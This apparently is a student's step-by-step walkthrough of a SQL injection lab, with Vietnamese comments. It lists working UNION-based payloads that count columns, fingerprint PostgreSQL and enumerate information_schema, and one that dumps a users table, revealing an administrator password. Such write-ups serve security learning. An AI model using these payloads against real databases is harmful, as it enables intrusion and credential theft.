' ORDER BY 1--
' ORDER BY 2--

' UNION SELECT version(), NULL-- 
(Từ cách dùng version như này thì xác định được là dung PostgreSQL)

' UNION SELECT table_name, NULL FROM information_schema.tables--
(Kiếm information_schema.tables PostgreSQL trên mạng để tìm thì tìm đc tên cột là table_name)

users_dagdkt

' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_dagdkt'--
(Tương tự như trên thì kiếm được bảng rồi thì kiếm tên cột)

password_vofxgd
username_yxxamz
email

'UNION SELECT username_yxxamz, password_vofxgd FROM users_dagdkt--
(Có tên 2 cột là username với pass rồi, mặt khác lại biết tên bảng rồi, thì cho nó hiện ra luôn)

administrator
0k75hb39t3qykxb1bftw
